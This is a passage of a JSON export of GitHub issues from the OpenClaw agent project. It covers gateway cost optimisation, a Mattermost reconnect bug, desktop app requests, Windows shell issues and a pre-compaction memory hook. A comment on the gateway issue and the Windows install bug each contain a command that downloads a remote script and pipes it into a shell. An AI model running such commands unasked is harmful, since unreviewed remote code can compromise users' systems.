(-60% embedding costs)\n- **Log Compression**: Deduplication and stack-trace truncation (-70% log tokens)\n\n#### 6. **Safety Features**\n- **Patch Risk Score**: Weighted scoring based on path, file type, and change ratio\n- **Transaction Pattern**: Atomic patch application with automatic rollback\n- **Capability-Based Tools**: Allowlist for filesystem operations with audit logging\n\n### 📊 Expected Cost Reduction\n\n| Component | Baseline Cost | Optimized Cost | Savings |\n|-----------|---------------|----------------|---------|\n| **Input Tokens** (Context Budgeting) | $50/mo | $20/mo | **60%** |\n| **Output Tokens** (Diff Format) | $75/mo | $12/mo | **84%** |\n| **Router** (Groq vs Ollama on AWS) | $0 (needs $60 server) | $2/mo | **$58** |\n| **Cache Hits** (40% hit rate) | - | -$30/mo | **30%** |\n| **Prompt Caching** (90% system prompt) | $15/mo | $1.50/mo | **90%** |\n\n\n#### Overall Cost Comparison\n\n| Scenario | Current (Direct) | With Gateway | Savings |\n|----------|------------------|--------------|---------|\n| Light (100 req/day) | ~$50/month | ~$8-12/month | **76-84%** |\n| Standard (500 req/day) | ~$162/month | ~$20-25/month | **85-88%** |\n| Heavy (1000 req/day) | ~$300/month | ~$35-45/month | **85-88%** |\n\n### 🚀 Performance Metrics\n\n| Metric | Target | Impact |\n|--------|--------|--------|\n| Cache Hit Rate | >40% | -30% API calls |\n| Router Latency (p95) | <300ms | Faster than Ollama |\n| Verifier Skip Rate | >50% | -50% verification costs |\n| Premium Request Ratio | <25% | Most queries use cheap/local |\n| Context Compression | >30% | Smaller input tokens |\n| **Diff Output Ratio** | **>80%** | **90% fewer output tokens** |\n\n## Implementation Plan\n\n### Phase 1: Infrastructure & Core (Days 1-3)\n- [ ] FastAPI skeleton with health endpoints\n- [ ] Groq router integration\n- [ ] Hard Policy Gate implementation\n- [ ] Rate limiting & kill switch\n\n### Phase 2: Caching & Premium (Days 4-7)\n- [ ] SQLite FTS5 for BM25 search\n- [ ] Query embedding cache\n- [ ] **Diff-only system prompt for Premium tier**\n- [ ] **Unified diff parser and validator**\n- [ ] Anthropic Prompt Caching integration\n- [ ] Semantic cache with risk-stratified verifier\n- [ ] Context budgeting & log compression\n\n### Phase 3: Tools & Hardening (Days 8-10)\n- [ ] Capability-based filesystem tools\n- [ ] **Atomic patch application with rollback**\n- [ ] Patch risk scoring system\n- [ ] Monitoring dashboard (Prometheus/Grafana)\n- [ ] Alerting rules configuration\n- [ ] 24-hour load testing\n\n### Phase 4: Beta & Production (Days 11-14)\n- [ ] Beta rollout (10% → 50% → 100% traffic)\n- [ ] Feedback collection & tuning\n- [ ] Documentation & runbook\n- [ ] Production deployment\n\n## Technical Stack\n\n**Backend:**\n- FastAPI + Uvicorn\n- SQLite for caching (FTS5 for BM25, separate DB for semantic cache)\n- Python 3.11+ with async/await\n- `unidiff` library for diff parsing and validation\n\n**External Services:**\n- Groq (Llama 3.1 8B) for intent classification\n- Anthropic Claude (Haiku & Sonnet)\n- OpenAI (embeddings fallback only)\n\n## Benefits\n\n### For Developers\n- ✅ **85-88% cost reduction** vs direct API calls\n- ✅ **90% fewer output tokens** with diff-only responses\n- ✅ **40%+ cache hit rate** eliminates redundant requests\n- ✅ **Sub-second responses** for cached queries\n- ✅ **Smart routing** ensures quality while minimizing costs\n- ✅ **Budget protection** prevents surprise bills\n\n### For Security\n- ✅ **Pre-LLM policy gate** blocks dangerous operations\n- ✅ **Audit logging** for all filesystem operations\n- ✅ **Capability-based tools** with three-zone access control\n- ✅ **Patch risk scoring** prevents high-risk automated changes (score >15 blocked)\n- ✅ **Transaction rollback** for failed patch applications\n- ✅ **Diff validation** ensures patches apply cleanly before execution\n\n### For Operations\n- ✅ **Predictable costs**: €20-30/month for typical usage (vs €90-160 direct)\n- ✅ **Comprehensive monitoring** with Prometheus metrics\n- ✅ **Automated alerting** for budget/performance issues\n- ✅ **Simple deployment**: Single server, no complex AWS setup\n- ✅ **GDPR compliance**: EU-hosted (Hetzner Germany)\n- ✅ **Deterministic patching**: Fingerprint-based validation prevents stale patches\n\n## Key Innovation: Diff-Only Responses\n\n### How It Works\n\n**System Prompt Instruction:**\n\n\n**Cost Impact Example:**\n\n| Scenario | Full File | Diff Only | Savings |\n|----------|-----------|-----------|---------|\n| Small patch (10 lines changed) | 800 tokens | 120 tokens | **85%** |\n| Medium patch (50 lines changed) | 1500 tokens | 350 tokens | **77%** |\n| Large refactor (100 lines) | 2500 tokens | 600 tokens | **76%** |\n\n**At $15/1M output tokens (Sonnet):**\n- 1000 patches/month full file: $37.50\n- 1000 patches/month diff only: $6.00\n- **Monthly savings: $31.50 on output alone**\n\n### Safety Measures\n\n1. **Patch Risk Scoring** (0-20 scale):\n   - High-risk paths (`.env`, `package.json`): +5 points\n   - High-risk extensions (`.py`, `.js`): +3 points\n   - Large change ratio (>50% of file): +5 points\n   - **Score >15**: Patch blocked, requires manual review\n\n2. **Atomic Application**:\n   ```python\n   # Create backup before applying\n   # Validate patch applies cleanly with --dry-run\n   # Apply patch in transaction\n   # If fails: automatic rollback from backup\n",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/9244",
      "createdAt": "2026-02-05T01:42:55Z",
      "updatedAt": "2026-02-11T08:54:05Z",
      "author": "sp4cerat",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3868575686,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9244#issuecomment-3868575686",
          "createdAt": "2026-02-08T23:45:10Z",
          "updatedAt": "2026-02-08T23:45:10Z",
          "author": "1bcMax",
          "body": "This is an incredibly thorough proposal! I've been working on similar cost optimization and wanted to share what I built.\n\n**ClawRouter** implements the three-tier intelligent routing you described, plus adds a fourth tier for reasoning models:\n\n| Tier | Models | Use Case |\n|------|--------|----------|\n| SIMPLE | Haiku, GPT-4o-mini | Quick queries, acknowledgments |\n| MEDIUM | Sonnet, GPT-4o | Standard coding, docs |\n| COMPLEX | Opus, GPT-4.5 | Multi-step, architectural |\n| REASONING | o1, o3 | Formal proofs, deep analysis |\n\nThe classification uses 14-dimension weighted scoring (<1ms, no LLM call needed):\n- Reasoning markers, code presence, multi-step patterns\n- Question complexity, file count, length normalization\n\nYour cost projections align with what I've seen: 76-88% savings depending on workload.\n\nOne thing I'd add: using an LLM for routing (even Groq) adds 150-250ms latency per message. A heuristic approach classifies in <1ms while catching ~95% of cases correctly.\n\nYou can try it now as an OpenClaw plugin:\n```bash\ncurl -fsSL https://raw.githubusercontent.com/BlockRunAI/ClawRouter/main/scripts/reinstall.sh | bash\n```\n\nGitHub: https://github.com/BlockRunAI/ClawRouter\n\nWould be interested in collaborating if you're actively building this gateway - especially on the caching and diff-only response features you mentioned."
        },
        {
          "id": 3882078889,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9244#issuecomment-3882078889",
          "createdAt": "2026-02-11T04:41:44Z",
          "updatedAt": "2026-02-11T04:41:44Z",
          "author": "aerouser",
          "body": "+1 on this feature! This would be a game-changer for cost optimization.\n\nWe're currently spending ~$695/month with Kimi K2.5 and tried to configure DeepSeek for heartbeats to save ~$115/month, but we're hitting issue #6671 (heartbeat model override not working).\n\nThis Cost-Optimized Gateway would solve our problem in an even better way:\n- **Heartbeat checks** every 30min (simple tasks → cheap model)\n- **Complex operations** → premium models\n- **Automatic routing** based on context\n\n**Our use case:**\n- Production deployment for Orion Brindes (e-commerce automation)\n- Multiple cron jobs and heartbeat checks daily\n- Expected savings: $100-150/month\n\nHappy to beta test when available and provide feedback from a production environment!"
        },
        {
          "id": 3883087914,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9244#issuecomment-3883087914",
          "createdAt": "2026-02-11T08:49:42Z",
          "updatedAt": "2026-02-11T08:54:05Z",
          "author": "sp4cerat",
          "body": "I just completed a first version of the gateway as separate project. Just set it as gateway in openclaw. I have not made a lot of tests yet so first maybe test in a sandbox\n\nhttps://github.com/sp4cerat/LLM-Gateway\n\n> +1 on this feature! This would be a game-changer for cost optimization.\n> \n> We're currently spending ~$695/month with Kimi K2.5 and tried to configure DeepSeek for heartbeats to save ~$115/month, but we're hitting issue #6671 (heartbeat model override not working).\n"
        }
      ]
    },
    {
      "number": 13980,
      "title": "[Bug]: Mattermost WebSocket never auto-reconnects on disconnect (monitor.ts line 984)",
      "body": "## Summary\n\nMattermost WebSocket connection drops after ~14-18 hours and never auto-reconnects. The channel logs `channel exited: fetch failed` and then stops receiving messages until a manual Gateway restart.\n\n## Steps to reproduce\n\n1. Start OpenClaw Gateway with Mattermost channel configured\n2. Wait for normal operation (~14-18 hours)\n3. WebSocket connection drops (observed via `docker logs openclaw-gateway`)\n4. Observe that no automatic reconnection attempts occur\n5. Messages sent to Mattermost channels are not received by the agent\n6. Manual Gateway restart is required to restore connectivity\n\n## Expected behavior\n\nWhen the Mattermost WebSocket connection drops:\n\n1. Gateway should log the disconnection error\n2. Gateway should automatically attempt to reconnect (with exponential backoff)\n3. Reconnection should succeed if the Mattermost server is available\n4. The agent should continue receiving and processing messages without manual intervention\n\n## Actual behavior\n\nWhen the Mattermost WebSocket connection drops:\n\n1. ✅ Gateway logs the disconnection: `[mattermost] [default] channel exited: fetch failed`\n2. ❌ No automatic reconnection attempts occur\n3. ❌ The channel remains dead indefinitely\n4. ❌ Manual Gateway restart is required to restore the connection\n\n## Environment\n\n- **OpenClaw version:** 2026.2.9\n- **OS:** Linux (arm64, Radxa device)\n- **Install method:** Docker\n- **Plugin:** @openclaw/mattermost v2026.2.9\n- **Platform:** Self-hosted Mattermost server \n\n## Logs or screenshots\n\n```\n2026-02-10T15:04:03.061Z [mattermost] [default] starting channel\n2026-02-10T15:05:28.825Z [mattermost] connected as @openclawbot\n[14+ hours of normal operation...]\n2026-02-11T05:36:43.872Z [mattermost] [default] channel exited: fetch failed\n[No further connection attempts until manual restart]\n2026-02-11T05:45:34.112Z [mattermost] connected as @openclawbot (after restart)\n```\n\n**Task processing evidence** (tasks were queued but responses never sent back to Mattermost):\n\n```\nlane enqueue: lane=session:agent:main:mattermost:channel:szoupx7yapdrmdh5k93pormigc\nlane dequeue: lane=session:agent:main:mattermost:channel:szoupx7yapdrmdh5k93pormigc waitMs=17\nlane task done: lane=session:agent:main:mattermost:channel:szoupx7yapdrmdh5k93pormigc durationMs=74109\n```\n\nTasks took 2.8 minutes to complete but no responses were posted back to the Mattermost channel.\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13980",
      "createdAt": "2026-02-11T08:51:01Z",
      "updatedAt": "2026-02-11T08:51:01Z",
      "author": "vernonstinebaker",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 75,
      "title": "Linux/Windows Clawdbot Apps",
      "body": "We have apps for macOS, iOS and Android (simpler nodes)\n\nLinux and Windows are missing. Similar feature set to macOS ideally.",
      "state": "open",
      "comments": 18,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/75",
      "createdAt": "2026-01-01T16:55:34Z",
      "updatedAt": "2026-02-11T08:49:07Z",
      "author": "steipete",
      "labels": [
        "enhancement",
        "help wanted"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "windows",
          "linux"
        ],
        "components": [
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3719011711,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/75#issuecomment-3719011711",
          "createdAt": "2026-01-07T13:56:18Z",
          "updatedAt": "2026-01-07T13:56:18Z",
          "author": "CashWilliams",
          "body": "Started looking into Linux port. I'm testing using https://v2.tauri.app/ because Linux Qt/GTK3/GTK4/Wayland/X11 who knows. Linux purists will probably hate it but it's working.\n\n<img width=\"2880\" height=\"1800\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/eb55dcbf-9dc2-4f60-bf06-43f038e9d246\" />"
        },
        {
          "id": 3747113141,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/75#issuecomment-3747113141",
          "createdAt": "2026-01-14T00:16:34Z",
          "updatedAt": "2026-01-14T00:16:34Z",
          "author": "steipete",
          "body": "My vision for this is a cute gtk-native Linux app. Esp for the statusbar features. This looks neat - I think we can do better tho!\n(or offer more variants, native will take longer)"
        },
        {
          "id": 3794403876,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/75#issuecomment-3794403876",
          "createdAt": "2026-01-24T10:13:59Z",
          "updatedAt": "2026-01-24T10:13:59Z",
          "author": "apoorvagnihotri",
          "body": "Looking forward to have linux support as well. I would love to contribute with my agents too. @steipete could you lead on how can we organize this? \n\nI am particularly interested in controlling my linux system via messages, run commands and in general have a similar level of support as macos. "
        },
        {
          "id": 3794451961,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/75#issuecomment-3794451961",
          "createdAt": "2026-01-24T10:50:01Z",
          "updatedAt": "2026-01-24T10:50:01Z",
          "author": "steipete",
          "body": "Awesome @apoorvagnihotri ! Just start and make a PR and we iteratively merge improvements!"
        },
        {
          "id": 3796882347,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/75#issuecomment-3796882347",
          "createdAt": "2026-01-25T16:13:08Z",
          "updatedAt": "2026-01-25T16:13:48Z",
          "author": "uos-status",
          "body": "For windows/linux, taskbar widgets and/or systray integration would be awesome.\nimagine replacing your windows searchbar with a clawdbot input field. -- but this could/should be a separate app. it would hook into the gateway websocket like any other app."
        },
        {
          "id": 3812984655,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/75#issuecomment-3812984655",
          "createdAt": "2026-01-28T18:11:45Z",
          "updatedAt": "2026-01-28T18:11:45Z",
          "author": "AdamParker19",
          "body": "Guys I have a solution here check this out https://github.com/moltbot/moltbot/issues/3319"
        },
        {
          "id": 3815779234,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/75#issuecomment-3815779234",
          "createdAt": "2026-01-29T06:38:14Z",
          "updatedAt": "2026-01-29T06:38:14Z",
          "author": "shanselman",
          "body": "Here's one https://github.com/shanselman/moltbot-windows-hub \n\n<img width=\"320\" height=\"872\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/8d84cddb-1d37-4096-afb5-fffbd3c0bbca\" />"
        },
        {
          "id": 3821876476,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/75#issuecomment-3821876476",
          "createdAt": "2026-01-30T05:24:18Z",
          "updatedAt": "2026-01-30T05:24:18Z",
          "author": "DevDeepakBhattarai",
          "body": "Looking forward to voice wake feature in windows as well. Just like how it works in mac right now "
        },
        {
          "id": 3824456729,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/75#issuecomment-3824456729",
          "createdAt": "2026-01-30T16:01:13Z",
          "updatedAt": "2026-01-30T16:01:13Z",
          "author": "arjunaskykok",
          "body": "I think I can give a hand in Windows because I personally use Windows. Lemme get familiar with the codebase for a while!"
        },
        {
          "id": 3825093637,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/75#issuecomment-3825093637",
          "createdAt": "2026-01-30T18:33:18Z",
          "updatedAt": "2026-01-30T18:33:18Z",
          "author": "steipete",
          "body": "Love this, we should defo get this in! Apps are a bit of a secondary focus rn as core/security is more important, but happy to see progress there! Love the work that @shanselman is doing here!"
        },
        {
          "id": 3830284871,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/75#issuecomment-3830284871",
          "createdAt": "2026-02-01T03:37:06Z",
          "updatedAt": "2026-02-01T03:37:06Z",
          "author": "NetZhen",
          "body": "Looking forward to more tools available for Linux/Windows."
        },
        {
          "id": 3833574983,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/75#issuecomment-3833574983",
          "createdAt": "2026-02-02T08:03:50Z",
          "updatedAt": "2026-02-02T08:03:50Z",
          "author": "tinkle21",
          "body": "Seems Windows support is missing. And most of skill are Mac related .Going through code. Try to fix it. : Getting below error 127.0.0.1 refused to connect."
        },
        {
          "id": 3833580868,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/75#issuecomment-3833580868",
          "createdAt": "2026-02-02T08:05:00Z",
          "updatedAt": "2026-02-02T08:05:00Z",
          "author": "Saingsophea",
          "body": "> We have apps for macOS, iOS and Android (simpler nodes)\n> \n> Linux and Windows are missing. Similar feature set to macOS ideally.\n\n"
        },
        {
          "id": 3836697611,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/75#issuecomment-3836697611",
          "createdAt": "2026-02-02T17:39:50Z",
          "updatedAt": "2026-02-02T17:39:50Z",
          "author": "jyorko",
          "body": "Yep stop guys DELETE EVERYTHING, start over ,  START with SECURITY and work your way back up"
        },
        {
          "id": 3838463372,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/75#issuecomment-3838463372",
          "createdAt": "2026-02-03T02:08:32Z",
          "updatedAt": "2026-02-03T02:08:32Z",
          "author": "bugparty",
          "body": "> My vision for this is a cute gtk-native Linux app. Esp for the statusbar features. This looks neat - I think we can do better tho! (or offer more variants, native will take longer)\n\nif it is written in gtk, windows can also reuse that gui part"
        },
        {
          "id": 3863205455,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/75#issuecomment-3863205455",
          "createdAt": "2026-02-07T00:50:54Z",
          "updatedAt": "2026-02-07T00:50:54Z",
          "author": "guwidoe",
          "body": "I've been working on a Windows companion app that addresses this for the Windows side:\n\n**[OpenClaw Windows Node Manager](https://github.com/guwidoe/OpenClawWindowsNodeManager)**\n\n### What it does\n\n- **System tray app** with one-click connect/disconnect toggle and color-coded status icons\n- **Settings UI** for gateway configuration, secure token storage (DPAPI encrypted), and gateway connectivity testing\n- **Node host management**: Install/uninstall, start/stop with proper process lifecycle handling, option to hide console and capture output\n- **Chrome relay setup**: Configure port, verify connectivity, quick access to extension folder\n- **Logs & diagnostics**: View node host output in-app, export diagnostic bundles (ZIP with redacted config + logs)\n- **CLI** for automation: `openclaw-win status`, `connect`, `disconnect`, `toggle`, `doctor`, etc.\n\n### Current limitations\n\nThis is focused on connection management. It doesn't yet have feature parity with macOS/iOS/Android for canvas display, screen capture, camera, or notifications relay.\n\nStill early but functional. Would love feedback and I'm open for feature requests/pull requests."
        },
        {
          "id": 3863205734,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/75#issuecomment-3863205734",
          "createdAt": "2026-02-07T00:51:03Z",
          "updatedAt": "2026-02-07T00:51:03Z",
          "author": "guwidoe",
          "body": "I've been working on a Windows companion app that addresses this for the Windows side:\n\n**[OpenClaw Windows Node Manager](https://github.com/guwidoe/OpenClawWindowsNodeManager)**\n\n### What it does\n\n- **System tray app** with one-click connect/disconnect toggle and color-coded status icons\n- **Settings UI** for gateway configuration, secure token storage (DPAPI encrypted), and gateway connectivity testing\n- **Node host management**: Install/uninstall, start/stop with proper process lifecycle handling, option to hide console and capture output\n- **Chrome relay setup**: Configure port, verify connectivity, quick access to extension folder\n- **Logs & diagnostics**: View node host output in-app, export diagnostic bundles (ZIP with redacted config + logs)\n- **CLI** for automation: `openclaw-win status`, `connect`, `disconnect`, `toggle`, `doctor`, etc.\n\n### Current limitations\n\nThis is focused on connection management. It doesn't yet have feature parity with macOS/iOS/Android for canvas display, screen capture, camera, or notifications relay.\n\nStill early but functional. Would love feedback and I'm open for feature requests/pull requests."
        },
        {
          "id": 3883085435,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/75#issuecomment-3883085435",
          "createdAt": "2026-02-11T08:49:07Z",
          "updatedAt": "2026-02-11T08:49:07Z",
          "author": "akayc7",
          "body": "<img width=\"2279\" height=\"1239\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/8d53ec82-8586-4ce1-ad5d-073139d89041\" />\nWhat happend\n"
        }
      ]
    },
    {
      "number": 13978,
      "title": "[Bug]: Installation failed",
      "body": "## Summary\n\nStart the installation according to the instructions in the document\n\nhttps://docs.openclaw.ai/start/getting-started#windows-powershell\n\n## Environment\n\n- Clawdbot version:latest\n- OS:win10\n- Install method (pnpm/npx/docker/etc):iwr -useb https://openclaw.ai/install.ps1 | iex\n\n## Logs or screenshots\n\n![Image](https://github.com/user-attachments/assets/d4bf111f-6960-4649-9298-eec0d4339d2f)\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13978",
      "createdAt": "2026-02-11T08:48:55Z",
      "updatedAt": "2026-02-11T08:48:55Z",
      "author": "panjunqiao",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows",
          "docker"
        ],
        "components": [
          "websocket"
        ]
      }
    },
    {
      "number": 13921,
      "title": "[Bug]: Gemini subagent generates bash syntax on Windows (PowerShell host)",
      "body": "## Description\n\nWhen Gemini models (`google/gemini-2.5-pro`, `google/gemini-2.5-flash`) run as isolated session agents (cron jobs, subagents) on Windows, they consistently generate bash/unix syntax for the `exec` tool instead of PowerShell.\n\n## Examples\n\nGemini generates:\n- `curl -s http://localhost:11434/api/tags` instead of `Invoke-RestMethod`\n- `grep -r 'pattern' --include='*.ts'` instead of `Select-String`\n- `cat /etc/hosts` instead of `Get-Content`\n- Bash pipes (`|`) with unix tools that don't exist on Windows\n\n## Impact\n\n- Cron jobs fail after first tool error, wasting tokens\n- Cascading failures when Gemini retries with more bash\n- Required workaround: run PowerShell scripts via `-File` parameter instead of inline commands\n- DEC-013 Opus fallback catches this, but at higher cost\n\n## Expected Behavior\n\nThe agent runtime should hint or enforce the host shell in the system prompt for isolated sessions, similar to how the main session reports `shell=pwsh` in runtime context.\n\n## Suggested Fix\n\nInclude `os=Windows_NT` and `shell=pwsh` in the isolated session system prompt context, so models adapt their tool usage accordingly. Alternatively, provide a shell-specific preamble for exec tool calls.\n\n## Environment\n\n- **OS:** Windows 11 Pro\n- **OpenClaw:** 2026.2.9\n- **Models affected:** All Gemini variants\n- **Models NOT affected:** Anthropic Claude (adapts to Windows context correctly)",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13921",
      "createdAt": "2026-02-11T07:06:58Z",
      "updatedAt": "2026-02-11T08:47:54Z",
      "author": "ukr-coder",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "windows"
        ],
        "components": [
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3883080467,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13921#issuecomment-3883080467",
          "createdAt": "2026-02-11T08:47:54Z",
          "updatedAt": "2026-02-11T08:47:54Z",
          "author": "An0nym0us-Cr4ck3r",
          "body": "Its not bug skill issue\n"
        }
      ]
    },
    {
      "number": 13922,
      "title": "[Feature]: Pre-compaction hook / memory flush event",
      "body": "## Description\n\nWhen OpenClaw triggers context compaction, the model loses all in-session state without warning. A pre-compaction hook or event would allow the model to persist critical state to disk before compaction occurs.\n\n## Use Case\n\nOur agent (Opus 4.6, 977k context) accumulates significant working context during long sessions:\n- Active task state\n- Unfinished analysis\n- Temporary data structures\n- Cross-reference context from multiple tool calls\n\nWhen compaction triggers, this is lost. We've built a workaround (Pre-compaction memory flush system event via cron), but it's imprecise — it fires on a schedule rather than when compaction actually happens.\n\n## Proposed Solutions\n\n### Option A: Pre-compaction system event\nInject a system message like `[SYSTEM] Context compaction imminent. Persist any critical state now.` before compaction runs, giving the model one turn to write to disk.\n\n### Option B: Configurable hook\n```json\n{\n  \"agents\": {\n    \"defaults\": {\n      \"hooks\": {\n        \"preCompaction\": {\n          \"message\": \"Memory flush: store durable state to memory/YYYY-MM-DD.md\"\n        }\n      }\n    }\n  }\n}\n```\n\n### Option C: Automatic workspace file snapshot\nBefore compaction, automatically snapshot key workspace files (configurable list) so the post-compaction session can reference them.\n\n## Current Workaround\n\nWe use a scheduled system event (`Pre-compaction memory flush`) that fires periodically, but this:\n- Wastes turns when no compaction is needed\n- Misses compactions that happen between scheduled flushes\n- Can't react to actual context pressure\n\n## Related\n\n- #13097 (context overflow warning)\n- #13499 (auto-spawn at context threshold)\n- #13416 (post-compaction amnesia)\n\n## Environment\n\n- **OpenClaw:** 2026.2.9\n- **Model:** claude-opus-4-6 (977k context)\n- **Session type:** Long-running main agent sessions\n",
      "state": "closed",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13922",
      "createdAt": "2026-02-11T07:07:41Z",
      "updatedAt": "2026-02-11T08:39:30Z",
      "author": "ukr-coder",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3883047734,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13922#issuecomment-3883047734",
          "createdAt": "2026-02-11T08:39:28Z",
          "updatedAt": "2026-02-11T08:39:28Z",
          "author": "ukr-coder",
          "body": "## Resolution: Already Implemented ✅\n\nAfter deep-diving the codebase, this feature **already exists** in OpenClaw:\n\n- **File:** `src/auto-reply/reply/memory-flush.ts`\n- **Runner:** `src/auto-reply/reply/agent-runner-memory.ts` → `runMemoryFlushIfNeeded()`\n- **Config:** `agents.defaults.compaction.memoryFlush.enabled` (default: `true`)\n- **Threshold:** `softThresholdTokens` (default: 4000, we run 60000)\n\n### How it works:\n1. Before each agent turn, `shouldRunMemoryFlush()` checks if `totalTokens > contextWindow - reserveTokens - softThresholdTokens`\n2. If threshold exceeded AND not already flushed for current compaction count → runs a flush turn\n3. Flush turn sends: *'Pre-compaction memory flush. Store durable memories now...'*\n4. Agent persists state to disk, then normal turn proceeds\n5. Tracks `memoryFlushCompactionCount` to avoid duplicate flushes\n\n### Configurable:\n```json\n{\n  \"agents\": {\n    \"defaults\": {\n      \"compaction\": {\n        \"memoryFlush\": {\n          \"enabled\": true,\n          \"softThresholdTokens\": 60000,\n          \"prompt\": \"custom flush prompt\",\n          \"systemPrompt\": \"custom system prompt\"\n        }\n      }\n    }\n  }\n}\n```\n\nThis can be closed — the feature is complete and working. Tested with Opus 4.6 on 977k context window."
        },
        {
          "id": 3883047842,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/13922#issuecomment-3883047842",
          "createdAt": "2026-02-11T08:39:30Z",
          "updatedAt": "2026-02-11T08:39:30Z",
          "author": "ukr-coder",
          "body": "Already implemented in current version. See comment above."
        }
      ]
    },
    {
      "number": 13552,
      "title": "[Bug]: macOS companion app fails to pass gateway auth token over SSH tunnel — no UI field, no auto-read from remote config",
      "body": "## Summary\n\nThe macOS companion app cannot connect to a remote gateway over SSH tunnel when the gateway has `auth.mode: \"token\"` configured. The app establishes the SSH tunnel and discovers the gateway, but fails with:\n\n```\nGateway error: gateway connect: connect to gateway @ ws://127.0.0.1:18789: unauthorized: gateway token missing (provide gateway auth token)\n```\n\nThere is no UI field in the companion app to enter the gateway auth token, and the app does not appear to read it from the remote `openclaw.json` config after establishing the SSH connection.\n\n## Environment\n\n- **Companion App:** macOS (Apple Silicon), latest version as of 2026-02-10\n- **Gateway:** macOS (Darwin arm64), OpenClaw 2026.2.9\n- **Connection:** Remote over SSH tunnel (mDNS hostname)\n- **Gateway config:** `bind: \"loopback\"`, `auth.mode: \"token\"`, `auth.token: <set>`\n\n## Steps to Reproduce\n\n1. Set up a gateway on a remote host with `gateway.auth.mode: \"token\"` and a token configured\n2. On a Mac, open the Companion App → General → set to \"Remote (another host)\"\n3. Select \"SSH tunnel\" transport\n4. Enter SSH target (e.g. `wgj-ai@mmm4.local`)\n5. Set correct Project root and CLI path in Advanced settings\n6. Click \"Test remote\"\n\n## Observed Behavior\n\n1. **Initial state** — App connects via SSH, discovers the gateway (shows hostname \"mmm4\"), but immediately fails with \"unauthorized: gateway token missing\"\n\n2. **After correcting settings** — With correct SSH user, project root, and CLI path, the same auth error persists\n\n3. **Timeout variant** — In one attempt after correcting the CLI path, the app showed \"Testing...\" and spun indefinitely before timing out (possibly related to #9174 `setTimeout` issue in the companion app's bundled client code)\n\n4. **No token field** — There is no visible field in the companion app UI to provide the gateway auth token\n\n## Additional Issue: Incorrect hostname display\n\nThe discovered gateway card shows `wgj@openclaw.local` regardless of the actual hostname (`mmm4`) or SSH user (`wgj-ai`). The `openclaw.local` appears to be a hardcoded default or placeholder rather than the actual mDNS/hostname of the remote machine.\n\n## Expected Behavior\n\nWhen using SSH tunnel transport, the companion app should:\n1. Read the gateway auth token from the remote `openclaw.json` config after establishing the SSH connection (since it already SSHes in and runs the CLI to discover the gateway)\n2. Pass the token in the WebSocket handshake when connecting to the tunneled gateway\n3. Display the correct hostname and SSH user for the discovered gateway\n\nAlternatively, provide a UI field for manually entering the gateway auth token.\n\n## Workaround Attempted\n\n- Tried disabling gateway auth, but `gateway.auth.mode` only accepts `\"token\"` or `\"password\"` — there is no `\"none\"` or `\"off\"` option\n- Applied the #9174 `setImmediate` patch to the gateway-side code, but the companion app uses its own bundled client code\n\n## Related Issues\n\n- #9174 — `queueConnect()` `setTimeout` never fires, preventing node handshake completion (may also affect companion app's bundled client)\n- #5721 — macOS Companion App shows connected but Gateway reports `node connected: false` (same SSH tunnel context, likely same root cause family)\n- #5710 — Invalid connect params error when connecting to remote gateway over SSH\n\n## Screenshots\n\n### 1. Initial error (wrong SSH user, default paths)\n\n<img width=\"936\" height=\"982\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/5cb10d14-8aa3-4ea2-989f-4bc617068984\" />\n\n### 2. After correcting settings (correct user, paths)\n\n<img width=\"936\" height=\"982\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/fb480825-2204-423a-afb6-fb9da6975178\" />\n\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13552",
      "createdAt": "2026-02-10T18:02:19Z",
